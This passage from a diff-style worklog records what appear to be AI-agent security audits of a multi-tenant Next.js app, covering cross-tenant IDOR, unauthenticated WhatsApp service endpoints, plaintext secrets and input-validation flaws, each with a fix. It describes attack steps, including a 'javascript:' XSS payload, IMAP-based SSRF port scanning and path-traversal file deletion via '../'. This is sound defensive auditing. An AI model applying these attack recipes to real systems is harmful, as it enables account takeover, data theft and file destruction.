+| `GET/PATCH/DELETE /api/listening` (+ `[id]`, `/reply`) | `src/app/api/listening/route.ts:6-83`, `[id]/route.ts:1-21`, `[id]/reply/route.ts:39-67` | ListeningQuery + Mention have NO customerId; reply route also picks "any account with matching platform" — cross-tenant credential use |
+| `GET/POST/PATCH /api/linkbio` (+ `[id]`) | `src/app/api/linkbio/route.ts:1-82` | No customerId; any user can edit anyone's link-in-bio |
+| `GET/POST /api/competitors` (+ `[id]`, `/sync`) | `src/app/api/competitors/route.ts:1-53` | No customerId column |
+| `GET/POST /api/approvals` (+ `[id]`) | `src/app/api/approvals/route.ts:1-73`, `[id]/route.ts:1-55` | Approval has NO customerId; any user can approve/reject any request |
+| `GET/POST/PATCH /api/tasks` (+ `[id]`) | `src/app/api/tasks/route.ts`, `tasks/[id]/route.ts:38,52` | Task has customerId but PATCH/DELETE ignore it; GET also lacks filter |
+| `PATCH/DELETE /api/bank-accounts/[id]` | `src/app/api/bank-accounts/[id]/route.ts:6-21` | No auth check at all (relies on middleware); any logged-in user can edit/delete any bank account (incl. account number / IBAN / SWIFT) |
+| `POST /api/bank-accounts/[id]` `isDefault` toggle | `src/app/api/bank-accounts/[id]/route.ts:12` | `updateMany({ data: { isDefault: false } })` has NO `where` — un-defaults ALL bank accounts across ALL tenants globally |
+| `GET /api/mail` | `src/app/api/mail/route.ts:7-55` | Returns ALL mail servers + mailboxes + owner emails across all tenants (MailServer/Mailbox/MailMessage have no customerId column) |
+| `GET/POST/PATCH /api/mail/messages` | `src/app/api/mail/messages/route.ts:7-126` | Any user can list ALL mail messages (subjects, bodies, from/to addresses) and send mail from any mailbox |
+| `GET/POST /api/mail/mailboxes` (+ `[id]`) | `src/app/api/mail/mailboxes/route.ts:7-62` | Any user can create mailboxes on any mail server |
+| `POST /api/mail/sync` | `src/app/api/mail/sync/route.ts:18-132` | Any logged-in user triggers IMAP sync across ALL tenants' mail servers |
+| `GET/POST /api/devices` (+ `[id]`) | `src/app/api/devices/route.ts:1-23`, `[id]/route.ts:1-21` | No auth check at all; any user can list ALL devices (fingerprint + IP + location) and edit/delete any device |
+| `GET/POST /api/serial-keys` (+ `[id]`, `/activate`) | `src/app/api/serial-keys/route.ts:1-31` | No auth check; any user can list/create software-activation serial keys |
+| `GET/POST /api/api-keys` (+ `[id]`) | `src/app/api/api-keys/route.ts:1-31` | No role check; any viewer/member can list or mint `sf_…` API keys (POST returns full plaintext key) |
+| `GET /api/platform-credentials?userId=<other-user>` | `src/app/api/platform-credentials/route.ts:7-29` | Accepts arbitrary `userId`; returns masked (but partially leaking) credentials for ANY user |
+| `PUT /api/platform-credentials` | `src/app/api/platform-credentials/route.ts:32-70` | Accepts arbitrary `userId` in body; overwrites ANY user's OAuth credentials |
+| `POST /api/platform-credentials/[platform]/sync?userId&accountId` | `src/app/api/platform-credentials/[platform]/sync/route.ts:20-47` | Any user can trigger Twitter/IG/FB/LinkedIn sync for any user's account — uses their stored OAuth tokens |
+| `POST /api/sync/comments` `{ accountId }` | `src/app/api/sync/comments/route.ts:38-48` | Any user can sync comments on any account (uses stored creds) |
+| `POST /api/comments/classify` `{ accountId }` | `src/app/api/comments/classify/route.ts:32-41` | Any user can classify sentiment on any tenant's comments |
+| `GET /api/whatsapp` | `src/app/api/whatsapp/route.ts:16-48` | Returns ALL WhatsApp messages (senderPhone + content) across tenants; WhatsAppMessage has no customerId |
+| `POST /api/chat` | `src/app/api/chat/route.ts:78-106` | Accepts `receiverId` of any user (no tenant check); can send DMs cross-tenant |
+| `PATCH /api/team/[id]` (change role) | `src/app/api/team/[id]/route.ts:9-35` | NO auth check at all; ANY logged-in user can escalate themselves (or anyone) to `admin`. Privilege escalation |
+| `DELETE /api/team/[id]` | `src/app/api/team/[id]/route.ts:40-75` | Any user can delete any user |
+| `PATCH /api/users` `{ id }` (non-self) | `src/app/api/users/route.ts:54-145` | Manager check exists but no tenant check on `id` — a manager in tenant A can edit a user in tenant B (email/role/password reset) |
+| `POST /api/team` (create user) | `src/app/api/team/route.ts:53-107` | Accepts `body.customerId` directly (`finalCustomerId = body.customerId ?? scope.customerId` line 88); a manager can create users in any tenant |
+| `PATCH/DELETE /api/customers/[id]` | `src/app/api/customers/[id]/route.ts:7-51` | `requireAuth` only — any user can edit OR DELETE an entire Customer (the tenant itself); DELETE cascades tasks/posts/activities/invoices/subscriptions for that tenant |
+| `GET /api/admin` | `src/app/api/admin/route.ts:11-130` | `requireRole("admin")` accepts tenant admins (not just super-admin). Returns every user (with email), every account, every post (with author), every comment, every activity across ALL tenants |
+| `GET /api/integrations` | `src/app/api/integrations/route.ts:133-160` | `requireAuth` (any user) — returns which integrations are configured globally (info leak) |
+
+**Fix (per route):**
+- For models that have `customerId`: always wrap the `where` clause with `tenantWhere(scope, {...})` for `findMany`/`findFirst`, AND verify the row's `customerId === scope.customerId` (or use a compound `where: { id, ...tenantWhere(scope) }`) before any `update`/`delete` by `id`.
+- For models that lack `customerId` (`ListeningQuery`, `Mention`, `HashtagGroup`, `Competitor`, `CompetitorSnapshot`, `LinkInBio`, `Approval`, `Influencer`, `ChatMessage`, `WhatsAppMessage`, `WhatsAppConnection`, `MailServer`, `Mailbox`, `MailMessage`, `ApiKey`, `Device`, `Session`, `VPNSession`, `WebAuthnCredential`, `PasswordResetToken`, `EmailVerificationToken`, `Integration`, `TenantDatabase`, `SerialKey`): either add a `customerId` column + migration, OR scope via the owning relation (e.g. `MailMessage` belongs to `Mailbox` belongs to `MailServer`; query through the relation chain).
+- For `POST /api/team/[id]` PATCH and `/api/users` PATCH: explicitly check `targetUser.customerId === user.customerId` before allowing any mutation.
+- For `POST /api/team` create: ignore `body.customerId` for non-super-admins (force `scope.customerId`).
+- For `GET /api/admin` and `GET /api/integrations`: gate with super-admin check (`scope.isSuperAdmin`), not just `requireRole("admin")`.
+
+---
+
+### Finding 5 — `/api/inbox/[id]` PATCH + DELETE have NO handler-level auth + no tenant filter
+
+**Severity: Critical**
+
+`src/app/api/inbox/[id]/route.ts:6-20` — the entire file never calls `requireAuth`, `getTenantScope`, or `tenantWhere`. The middleware enforces that *some* valid JWT is present, but the handler does `db.comment.update({ where: { id } })` and `db.comment.delete({ where: { id } })` directly. Any authenticated user in any tenant can mutate or delete any comment by ID. (Note: the sibling `/api/inbox/route.ts` PATCH at lines 40-64 *does* correctly use `tenantWhere` — this `/[id]` route was missed.)
+
+**Fix:** Apply the same `findFirst({ where: { id, ...tenantWhere(scope) } })` guard used in `/api/inbox/route.ts:47-53` before allowing the `update`/`delete`.
+
+---
+
+### Finding 6 — WhatsApp mini-service has NO authentication at all
+
+**Severity: Critical**
+
+`mini-services/whatsapp-service/index.ts` exposes an HTTP server on port 3002 with NO auth of any kind. Endpoints accept `?ownerId=xxx` (or `X-Owner-Id` header) and blindly trust it. `Access-Control-Allow-Origin: *` (line 78) lets any website call it from a browser if the port is reachable.
+
+Concrete abuses by anyone who can reach the service:
+- `GET /sessions` (line 320) — list ALL connected users + their WhatsApp phone numbers
+- `GET /qr?ownerId=<victim>` (line 352) — fetch the victim's WhatsApp pairing QR code, which lets the attacker **take over the victim's WhatsApp account** by scanning it on their own device
+- `POST /webhook-target?ownerId=<victim>` (line 364) — silently redirect the victim's incoming WhatsApp messages to an attacker-controlled URL
+- `POST /send?ownerId=<victim>` (line 401) — send messages AS the victim
+- `POST /logout?ownerId=<victim>` (line 372) — disconnect the victim
+
+Additionally, `/api/whatsapp/webhook` (`src/app/api/whatsapp/webhook/route.ts:16-66`) is on the middleware PUBLIC_ROUTES allowlist (`src/middleware.ts:34`) and accepts `ownerId` from the query string with no signature verification. Anyone on the internet can POST fabricated WhatsApp messages (senderName + content of their choice) into the inbox of any user.
+
+**Fix:**
+1. Add a shared-secret check to every WhatsApp mini-service endpoint — e.g. require `Authorization: Bearer <WHATSAPP_SERVICE_TOKEN>` matching an env var set on both the Next.js app and the mini-service.
+2. Bind the mini-service to `127.0.0.1` only (it currently listens on the default `0.0.0.0`).
+3. Drop `Access-Control-Allow-Origin: *` — replace with an explicit allowlist of the app's origin, or remove CORS entirely (the Next.js app calls server-to-server, not browser-to-service).
+4. For `/api/whatsapp/webhook`: require an HMAC signature on the body, signed with the same shared secret, with `ownerId` embedded in the signed payload (the existing `signOAuthState`/`verifyOAuthState` helper in `src/lib/oauth-state.ts` is a good template).
+
+---
+
+### Finding 7 — `/api/oauth/connect` + `/api/oauth/check` accept arbitrary `userId`
+
+**Severity: High**
+
+`src/app/api/oauth/connect/[platform]/route.ts:76-92` accepts `userId` as a query param and looks up the OAuth app credentials for that user — but never verifies that the authenticated JWT belongs to that userId. Any logged-in user can:
+- Trigger an OAuth flow that, on callback, overwrites ANOTHER user's `PlatformCredential.oauth2UserToken` (`src/app/api/oauth/callback/[platform]/route.ts:491-498` — the callback trusts `userId` from the HMAC-signed state, which was set by the attacker in the connect step).
+- Probe `/api/oauth/check?userId=<other>` to enumerate which platforms another user has configured (`src/app/api/oauth/check/route.ts:12-28`).
+
+The OAuth `state` token is correctly HMAC-signed (`src/lib/oauth-state.ts`), which prevents tampering — but the userId inside it is attacker-chosen at the connect step.
+
+**Fix:** In `/api/oauth/connect/[platform]/route.ts:78`, require `userId === user.userId` (from the JWT) OR verify the user is a super-admin. Same in `/api/oauth/check/route.ts:14`.
+
+---
+
+### Finding 8 — `VPNSession.privateKey` + `config` (full WireGuard .conf with private key) stored in plaintext
+
+**Severity: High**
+
+`prisma/schema.prisma:920-923` — `privateKey` and `config` are plain `String`. The route `/api/vpn/qr/route.ts:27` and `/api/vpn/config/route.ts:25-27` correctly verify `session.userId === userId` before returning the QR/config (so no IDOR on the read path), but the storage at rest is plaintext. A DB backup leak exposes every user's WireGuard private key — letting an attacker impersonate any VPN client.
+
+**Fix:** Encrypt `privateKey` and `config` with `encrypt()` on session creation. Decrypt on the two read paths (`/api/vpn/qr`, `/api/vpn/config`).
+
+---
+
+### Finding 9 — Soft delete is not implemented anywhere; GDPR right-to-erasure not supported
+
+**Severity: High**
+
+`grep -r 'deletedAt\|softDelete\|isDeleted' src/app/api` returns no matches. Every `DELETE` handler calls `db.<model>.delete({ where: { id } })` (hard delete). Specifically:
+- `DELETE /api/customers/[id]` (`src/app/api/customers/[id]/route.ts:24-51`) cascades to invoices/quotations/serial-keys/subscriptions/tasks/posts/activities/campaigns — but `User.customerId` is just SET TO NULL (line 41), leaving the user records (with name, email, phone, birthDate) intact in the DB.
+- `DELETE /api/team/[id]` (`src/app/api/team/[id]/route.ts:73`) calls `db.user.delete({ where: { id } })` — but `Session`, `WebAuthnCredential`, `ChatMessage` (sender/receiver), `Activity` (userId), `Post` (authorId), `Account` (ownerId — reassign happens but only if `newOwnerId` provided), etc. all reference the user; cascade behaviour depends on schema `onDelete` rules, mostly defaulting to `Restrict` or leaving orphan rows.
+- `DELETE /api/posts/[id]` (`src/app/api/posts/[id]/route.ts:91-96`) wipes `PostVariant` then `Post` — including the analytics snapshot in `AnalyticsDaily` for variants.
+
+For GDPR Article 17 (right to erasure), the app has no API endpoint that takes a user ID and (a) purges or anonymises their PII across all tables (User, Session, ChatMessage sender/receiver, Activity, MailMessage, Comment.assigneeId, VPNSession, WebAuthnCredential) AND (b) writes an audit record of the erasure. There is no documented retention policy.
+
+**Fix:**
+1. Add a `deletedAt DateTime?` column to user-bearing models and switch `delete` → `update({ deletedAt: new Date() })`, with a global Prisma middleware or `findMany` wrapper that filters `deletedAt: null`.
+2. Implement `POST /api/users/[id]/gdpr-erase` that, for a given user, anonymises name/email/handles, wipes `Session`, `PasswordResetToken`, `EmailVerificationToken`, `ChatMessage` (their messages), `WebAuthnCredential`, `VPNSession`, `Mailbox.passwordEnc` etc., and writes an `AuditLog` row.
+3. Document retention: e.g. "User PII retained for 90 days after deletion for fraud/abuse review, then hard-purged via cron."
+
+---
+
+### Finding 10 — No `AuditLog` table; `Activity` is a user-facing feed, not a security log
+
+**Severity: High**
+
+`prisma/schema.prisma:229-243` defines `Activity` with `type` values like `post_published`, `comment_replied`, `account_connected`, `ai_generated`, `team_joined`. This is the user-visible activity feed shown in the dashboard, not a tamper-evident security audit log. There is no record of:
+- Who logged in / failed login attempts / password resets / 2FA enable/disable
+- Who changed another user's role or status
+- Who deleted a Customer (tenant) or a User
+- Who changed integration credentials (Stripe key, OpenAI key)
+- Who exported data or called bulk-list endpoints
+- Who granted/revoked API keys or sessions
+- Who changed OAuth credentials for a platform
+
+`Session` (`prisma/schema.prisma:830-842`) records `userAgent` and `ipAddress` per login session, which is a partial audit trail for "who logged in" — but sessions are deleted on cascade when a user is deleted, and there's no record of failed login attempts.
+
+**Fix:** Add an `AuditLog` model: `{ id, userId, customerId, action, resourceType, resourceId, ipAddress, userAgent, metadata (JSON), createdAt }`. Write to it from every mutating endpoint (login, logout, role change, deletion, credential save, integration save, export). Make it append-only (no `update` / `delete` allowed from app code). Retain for ≥1 year.
+
+---
+
+### Finding 11 — Bulk data exfiltration: no rate limit, no pagination, no audit on list endpoints
+
+**Severity: High**
+
+Every list endpoint uses `take: 50` (or `take: 100`, `take: 500` for `/api/comments/classify`) but:
+- No `cursor` / `skip` pagination — the take: 50 is the absolute cap per request, but a script can iterate with `?authorId=` / `?accountId=` queries to enumerate every record.
+- No rate limit on any list endpoint (`grep rateLimit` matches only `/api/ai/assistant/route.ts`).
+- No audit record when a user lists >N records or calls list endpoints in a tight loop.
+
+Combined with the cross-tenant IDORs in Finding 4, an attacker with a single low-privilege account in tenant A can dump every user (with email, phone, birthDate), every account, every post, every comment, every WhatsApp message (with senderPhone), every bank account (with accountNumber/IBAN/SWIFT), every mail message (with from/to/subject/body) across ALL tenants via `GET /api/users`, `GET /api/mail`, `GET /api/whatsapp`, `GET /api/bank-accounts`, `GET /api/devices` (no auth check at all), `GET /api/influencers`, `GET /api/admin` (if attacker has tenant admin), etc.
+
+**Fix:**
+1. Apply `tenantWhere(scope)` to EVERY `findMany` (see Finding 4).
+2. Add a simple sliding-window rate limiter (e.g. `@upstash/ratelimit` or in-memory `Map<userId, count>` with 60-second window) to all `/api/*` routes in middleware or a wrapping helper.
+3. Cap `take` server-side to ≤50 and clamp client-supplied `take` params.
+4. Add cursor pagination (`?cursor=...&take=50`) for any endpoint likely to grow.
+5. Log to `AuditLog` when a single user calls list endpoints >100× in 5 minutes.
+
+---
+
+### Finding 12 — PII in server logs
+
+**Severity: Medium**
+
+Most `console.*` calls log only error messages (good). Specific PII leaks:
+- `src/app/api/mail/sync/route.ts:109` — `console.error(\`[mail/sync] Error syncing mailbox ${mailbox.email}:\`, e)` writes the mailbox email address (PII) to server logs on every sync failure.
+- `src/app/api/sync/comments/route.ts:190,244,295,342,397` — logs `@${handle}` for every platform. Handles are PII-adjacent (often derivable to real names).
+- `src/app/api/dashboard/route.ts:752` — `console.error("[/api/dashboard] DB error:", message)` — if Prisma throws with the SQL query in the message, partial query contents (which may include userIds / post titles) land in logs.
+- `src/app/api/auth/login/route.ts:44,97` — logs full DB error messages on retry; could leak query contents.
+- `src/app/api/auth/signup/route.ts:108` — `console.error("Signup error:", error)` logs the full error object — if Prisma throws a unique-constraint violation, the email is included in the error message.
+- `mini-services/whatsapp-service/index.ts:208` — logs `[whatsapp:${ownerId}] ✓ Connected as ${session.phone}` — writes the user's WhatsApp phone number to stdout on every connection.
+- `mini-services/whatsapp-service/index.ts:138,183,194,208` — logs `ownerId` on every state change.
+
+**Fix:** Replace `${mailbox.email}` with `${mailbox.id}` in log strings. Wrap Prisma error logging with a sanitizer that strips `email`, `password`, `token` fields. In the WhatsApp service, hash `ownerId` (HMAC with a log secret) before logging. Add a `redact()` helper in `src/lib/utils.ts` and run every `console.*` argument through it.
+
+---
+
+### Finding 13 — `passwordEnc` field comment says "mock-encrypted" (legacy fallback retained)
+
+**Severity: Medium**
+
+`prisma/schema.prisma:503,519` declare `passwordEnc String // stored (mock-encrypted)`. The actual implementation in `src/lib/crypto.ts:70-105` uses real AES-256-GCM with a `v1:` prefix, but the `decrypt()` function explicitly accepts the legacy `enc:<base64>` format (lines 76-79) — which is plain base64, NOT encryption. Any mail-server / mailbox password that was saved before the crypto upgrade is still stored as plain base64 and silently decrypts to plaintext. An attacker with DB read access gets those passwords in cleartext even though the column name says "encrypted".
+
+**Fix:** Add a migration script `scripts/upgrade-mail-passwords.ts` that reads every `passwordEnc` starting with `enc:`, base64-decodes, and re-saves via `encrypt()`. Then remove the legacy fallback from `decrypt()` (lines 76-79) so future tampering is detected by GCM auth-tag failure.
+
+---
+
+### Finding 14 — `User.password` SELECT leaks in some code paths
+
+**Severity: Medium**
+
+The login route at `src/app/api/auth/login/route.ts:21-41` correctly `select`s the `password` field only for the bcrypt comparison — good. The signup route at `src/app/api/auth/signup/route.ts:47-75` correctly omits `password` from the `select` — good. However:
+- `src/app/api/auth/login/route.ts:44` logs the full DB error on retry failure, which (for Prisma) can include the query plan referencing the password column — though the actual hash value is unlikely to appear in the error message.
+- `src/app/api/users/route.ts:148` does `db.user.findUnique({ where: { id } })` with NO `select` clause — returns ALL columns including `password`, `totpSecret`. The response at lines 151-166 picks safe fields, but the in-memory object carries the hash + TOTP secret through the entire request lifecycle. If any error handler / logger dumps the object, those secrets leak.
+- `src/app/api/team/route.ts:13` does `db.user.findMany({ where: tenantWhere(scope) })` with NO `select` — fetches `password` and `totpSecret` for every team member into memory, even though only `name/email/avatar/role/title/department/status/color/lastActive` are used in the response.
+
+**Fix:** Add explicit `select: { ... }` (omitting `password` and `totpSecret`) to every `db.user.findUnique` / `findMany` in API routes. bcrypt cost factor 12 (used in `/api/auth/signup/route.ts:39`, `/api/auth/login/route.ts:57` indirectly via compare, `/api/auth/reset-password/route.ts:74`, `/api/users/route.ts:137`, `/api/team/route.ts:82-83`) is appropriate — keep at 12.
+
+---
+
+### Finding 15 — File uploads served publicly with no auth check
+
+**Severity: Medium**
+
+`src/lib/storage.ts:13` documents: "writes to public/uploads/<customerId>/<folder>/ served statically by Next.js at /uploads/...". Any file uploaded by a tenant user is reachable at `https://<host>/uploads/tenant_<customerId>/<folder>/<random>-<name>` with NO authentication. The 6-byte hex random prefix (`src/lib/storage.ts:89`) gives only ~16M permutations per folder — brute-forceable for high-value targets. Anyone who learns or guesses a URL (e.g. from a link shared in a chat message, or by enumerating random prefixes) can download the asset.
+
+The tenant scoping via `tenant_<customerId>` path segment IS present, but the URL structure reveals the customerId, and once a URL is known it remains accessible forever (no expiry, no signed URLs). There is no `MediaAsset` row required to fetch — the file is served directly from `public/`.
+
+For the Cloudinary adapter, files live on a public CDN — same problem (URL = access).
+
+**Fix:** Move uploads out of `public/` to a private directory. Add a Next.js route `GET /api/media/file/[id]` that loads the `MediaAsset` row, verifies `req.user.customerId === asset.customerId`, and streams the file with `Content-Disposition: inline`. For Cloudinary, use signed URLs with short TTLs (`cloudinary.utils.sign_request` or `signed_url: true` with `expires_in: 3600`).
+
+---
+
+### Finding 16 — `console.log("[llm] Using Claude provider from DB (model:", creds.model + ")")` and similar config logging
+
+**Severity: Low**
+
+`src/lib/llm.ts:373` logs the LLM model name (not the API key — verified). Low risk. Other `console.warn` calls in `storage.ts:213,521` log error messages only.
+
+**Fix:** No action needed for these specific lines; ensure future LLM-related logs never include `creds.apiKey`.
+
+---
+
+### Finding 17 — `verifyEmail` token URL returned in API response when no mail server configured
+
+**Severity: Low**
+
+`src/app/api/auth/forgot-password/route.ts:83-88` returns `resetUrl` in the JSON response when `sendEmail` fails. Same pattern in signup (`src/app/api/auth/signup/route.ts:103` — `verifyUrl: verifySent ? undefined : verifyUrl`). In production, if the mail server is misconfigured, anyone who triggers a forgot-password for a victim's email receives the reset URL in the response body — full account takeover. The code comments note "only expose in dev/test" but there is no environment check guarding the exposure.
+
+**Fix:** Wrap the `resetUrl` / `verifyUrl` returns in `if (process.env.NODE_ENV !== "production")`. In production, always return the same generic message regardless of mail-send success.
+
+---
+
+### Summary of severity counts
+
+| Severity | Count |
+|---|---|
+| Critical | 6 (Findings 1, 2, 3, 4, 5, 6) |
+| High | 5 (Findings 7, 8, 9, 10, 11) |
+| Medium | 5 (Findings 12, 13, 14, 15, 17) |
+| Low | 1 (Finding 16) |
+| Info | 0 |
+
+### Top 3 must-fix-immediately actions
+1. **Encrypt all stored secrets** (PlatformCredential OAuth tokens, Integration.credentials JSON, TenantDatabase.dbUrl, VPNSession.privateKey + config) using the existing `encrypt()` helper. (Findings 1, 2, 3, 8.)
+2. **Apply `tenantWhere(scope)` + ownership check before every `update`/`delete` by `id`** in every route handler under `src/app/api/`. The primitives exist — they just aren't used. Specifically fix `/api/posts/[id]`, `/api/inbox/[id]`, `/api/team/[id]`, `/api/bank-accounts/[id]`, `/api/customers/[id]`, `/api/accounts/[id]`, `/api/tasks/[id]`, `/api/approvals/[id]`, `/api/devices/[id]`, `/api/linkbio`, `/api/hashtags`, `/api/influencers`, `/api/listening`, `/api/competitors`, `/api/campaigns`, `/api/mail/*`, `/api/whatsapp`, `/api/admin`, `/api/platform-credentials*`, `/api/sync/comments`, `/api/comments/classify`. (Findings 4, 5.)
+3. **Lock down the WhatsApp mini-service** with a shared-secret bearer token + bind to localhost + drop CORS `*`, and require HMAC signature on `/api/whatsapp/webhook`. (Finding 6.)
+
+### Stage Summary
+
+- **Files audited:** `prisma/schema.prisma`, `src/lib/{tenant-db,auth-guard,crypto,storage}.ts`, `src/middleware.ts`, ~75 route handlers under `src/app/api/`, `mini-services/whatsapp-service/index.ts`.
+- **Code changes made by this audit:** None — read-only audit per task scope. No fixes were applied; the findings above are recommendations for the engineering team to implement.
+- **Verification:** `bun run lint` not run (no code changes); findings are static-analysis citations only.
+- **Highest-risk finding:** Finding 4 (cross-tenant IDOR across ~30 routes) — a single low-privilege account in any tenant can read or modify data belonging to every other tenant, including OAuth tokens (Finding 1), WhatsApp messages with phone numbers, mail messages with full bodies, bank accounts with account numbers, and admin overviews.
+- **Next actions:** Triage by severity (Critical → High → Medium). Findings 1, 4, 5, 6 are pre-emptive breach blockers and should be patched before any production rollout.
+
+---
+
+## Task ID: SECURITY-INPUT
+
+**Agent**: security-auditor (general-purpose sub-agent)
+**Task**: Audit INPUT VALIDATION & INJECTION protection of the Next.js app at `/home/z/my-project`. Covers all ~134 route handlers under `src/app/api/`, plus `src/lib/{storage,db,tenant-db,llm,auth-guard,oauth-state,crypto}.ts`. Specific attack classes: SQL injection, NoSQL/Prisma injection, XSS, command injection, path traversal, SSRF, mass assignment, file upload validation, ReDoS, rate limiting.
+
+### Methodology
+1. Read `/home/z/my-project/worklog.md` (10,822 lines) — reviewed prior SEC-4/5/6 + SECURITY-AUTH + SECURITY-INFRA + SECURITY-DATA audits to avoid duplicating already-reported findings.
+2. Listed all 134 `route.ts` files under `src/app/api/`; enumerated which ones lack `requireAuth`/`requireRole` (67 of them — they rely solely on the global Edge middleware JWT gate).
+3. `rg` greps for: `$queryRaw` / `$executeRaw` (raw SQL), `JSON.parse` of user input, `dangerouslySetInnerHTML`, `eval(`/`new Function`, `execSync`/`execFile`/`child_process`, `path.join`/`fs.*` with user input, `fetch(` of user-supplied URLs, `data: {...body}` spreads, `req.json()` shapes, regex literals on user input.
+4. Read every suspicious file fully and traced user-controlled values from request body → Prisma `where:` / `data:` / `fetch()` / `path.join()` / `execFile()` / `<a href>` rendering.
+5. Cross-referenced with SECURITY-DATA Findings 4/5/6/15 — those covered cross-tenant IDOR + plaintext credentials + public uploads. This audit focuses on the input-validation angle (mass assignment, JS-URL XSS, SSRF, path traversal in delete, missing rate limits) that the prior audits did not specifically call out.
+
+### Work Log
+
+The audit confirms the global Edge middleware (`src/middleware.ts`) enforces JWT signature on all `/api/*` routes except an explicit allowlist, so anonymous attackers are blocked at the edge. BUT the middleware does NOT enforce role, tenant scoping, body size, or rate limiting — that responsibility is pushed to each route handler, and ~67 of 134 handlers either omit `requireAuth`/`requireRole` entirely or fail to tenant-scope their mutations. Several classes of input-validation bug exist that the prior IDOR audits did not specifically call out:
+
+- **Stored XSS via public link-in-bio** — `linkbio` is in the `PUBLIC_ROUTES` middleware allowlist (`src/middleware.ts:35`), and `isPublicRoute` uses `pathname.startsWith("/api/linkbio")` (`src/middleware.ts:40-42`) so `/api/linkbio/[id]` PATCH and `/api/linkbio/[id]/click` are ALSO public (no JWT required). The PATCH route (`src/app/api/linkbio/[id]/route.ts:9-11`) accepts an arbitrary `links: [{ title, url, icon }]` array, which is rendered by `<a href={link.url}>` (`src/components/linkbio/bio-links.tsx:80-86`) on the public `/l/[slug]` page (`src/app/l/[slug]/page.tsx:126-144`). An unauthenticated attacker can POST `/api/linkbio` to mint a page, then PATCH `/api/linkbio/[id]` to inject `links: [{ url: "javascript:…" }]`; any visitor who clicks the link runs attacker JavaScript in their browser on the SYNQUE origin (cookies are httpOnly so direct cookie theft is mitigated, but XHR to `/api/users` etc. runs with the victim's session). This is a critical unauthenticated stored XSS.
+- **Stored XSS via team-chat `fileUrl`** — `POST /api/chat` (`src/app/api/chat/route.ts:78-106`) accepts `fileUrl` from the body and stores it verbatim. The chat UI renders `<a href={msg.fileUrl}>` (`src/components/views/chat.tsx:436`) and `<img src={msg.fileUrl}>` (line 433). Any authenticated user can DM `fileUrl: "javascript:alert(document.cookie)"` to any other user in any tenant (chat has no tenant scoping either — already noted in SECURITY-DATA Finding 4). Clicking the file link executes JS in the recipient's browser.
+- **SSRF + internal port scanner via mail server config** — `POST /api/mail` (`src/app/api/mail/route.ts:57-128`) accepts `imapHost` + `imapPort` + `username` + `password` from the body, then opens a real IMAP connection (`new ImapFlow({ host: imapHost, port: imapPort, … })` at lines 102-108). The handler has NO `requireAuth` call (relies on middleware JWT only), so any authenticated user can trigger an outbound TCP connect from the SYNQUE server to ANY host:port. Error messages from `client.connect()` (line 109) are returned in the HTTP response (line 122-127), so the endpoint functions as an internal-network port scanner + AWS-metadata-IP probe.
+- **SSRF via OpenAI baseUrl + Slack webhookUrl** — `POST /api/integrations/[type]` "test" (`src/app/api/integrations/[type]/route.ts:64-208`) issues `fetch(creds.webhookUrl, …)` (line 83, Slack), `fetch(\`${baseUrl}/chat/completions\`, …)` (line 171, OpenAI `baseUrl` from body), `fetch(\`https://api.cloudinary.com/v1_1/${cloudName}/resources/image\`, …)` (line 122, `cloudName` from body). All require admin role, but a tenant admin can probe internal IPs / SSRF the OpenAI baseUrl to any internal HTTP service.
+- **Path traversal via `storage.delete(storageKey)`** — `src/lib/storage.ts:136-150` `LocalFilesystemAdapter.delete()` does `path.join(PUBLIC_UPLOADS_DIR, storageKey)` WITHOUT checking that the resolved path stays inside `PUBLIC_UPLOADS_DIR`. The `storageKey` passed in comes from `existing.url.slice("/uploads/".length)` (`src/app/api/media/[id]/route.ts:48-49,52-53`). `existing.url` is settable via `PATCH /api/media/[id]` (`src/app/api/media/[id]/route.ts:23-28` — allowlist includes `url`) or `POST /api/media` (`src/app/api/media/route.ts:71-87` — `url` from body). So an authenticated user can set `url: "/uploads/../../package.json"`, then call `DELETE /api/media/[id]` which calls `storage.delete("../package.json")` → `path.join("<cwd>/public/uploads", "../package.json")` → resolves to `<cwd>/package.json` → `fs.unlink()` deletes it. Arbitrary file deletion inside the project working directory (and any nested directory reachable by relative path).
+- **Mass assignment: `role` + `customerId` on user creation** — `POST /api/team` (`src/app/api/team/route.ts:53-107`) is gated by `requireRole(req, "manager")` (good), but the handler reads `role` from body (`role: role ?? "member"` line 95) with NO allowlist against `["admin","super-admin"]`. A manager can create a new user with `role: "admin"` (escalating the new user above themselves — but they're already manager, so this only matters if admin-tier means cross-tenant access). More critically, line 88 `finalCustomerId = (body as { customerId?: string }).customerId ?? scope.customerId;` lets a manager create users in ANY tenant — already flagged in SECURITY-DATA Finding 4 but is a textbook mass-assignment vulnerability.
+- **Mass assignment: `ownerId` / `authorId` / `uploadedById` / `savedById`** — These "attribution" fields are accepted from the request body and persisted without verification:
+  - `POST /api/accounts` (`src/app/api/accounts/route.ts:121-174`) — `ownerId` from body; any user can register a social account under any other user's ownerId.
+  - `POST /api/posts` (`src/app/api/posts/route.ts:56-101`) — `authorId` from body.
+  - `POST /api/media` (`src/app/api/media/route.ts:71-87`) — `uploadedById` from body.
+  - `POST /api/whatsapp` (`src/app/api/whatsapp/route.ts:54-93`) — `savedById` from body (defaults to user!.userId, but body overrides).
+  - `POST /api/campaigns` (`src/app/api/campaigns/route.ts:25-42`) — `ownerId` from body (required, but not validated against JWT user).
+- **Critical mass assignment: `password` change without current-password check** — `PATCH /api/users` (`src/app/api/users/route.ts:54-145`) accepts `password` from body and hashes + writes it directly (lines 136-138). The role check at lines 89-111 correctly blocks non-admins from changing `role`, and the `isSelf` escalation guard at lines 100-108 blocks admin self-escalation. BUT the password-change path has NO check that the caller is the target user OR an admin — the only gate is `canManageOthers = isAdmin || isManager` (line 66). A manager can change ANY user's password (including the super-admin's), then log in as them. Full account takeover by a manager-role user.
+- **Command-injection surface (NOT exploitable as written, but pattern is dangerous)** — `src/app/api/customers/route.ts:48-63` calls `execSync('npx prisma db push --accept-data-loss', { env: { DATABASE_URL: dbUrl, … } })`. The `dbUrl` is built from sanitized `dbName` (`safeName = dbName.toLowerCase().replace(/[^a-z0-9_]/g, "_")` line 22) — `safeName` only contains `[a-z0-9_]` so it cannot break out of the SQL identifier quote or the env-var value. No shell interpolation of user input occurs. NOT a command-injection bug. BUT the same file at line 34 does `client.query(\`CREATE DATABASE "${safeName}"\`)` — string interpolation into a SQL DDL statement. Safe today because of the strict sanitizer, but a regression in the sanitizer would create a SQL-injection vector in DDL (which parameterized queries don't cover). Recommend adding an explicit assertion that `safeName === /^[a-z0-9_]+$/` before interpolating.
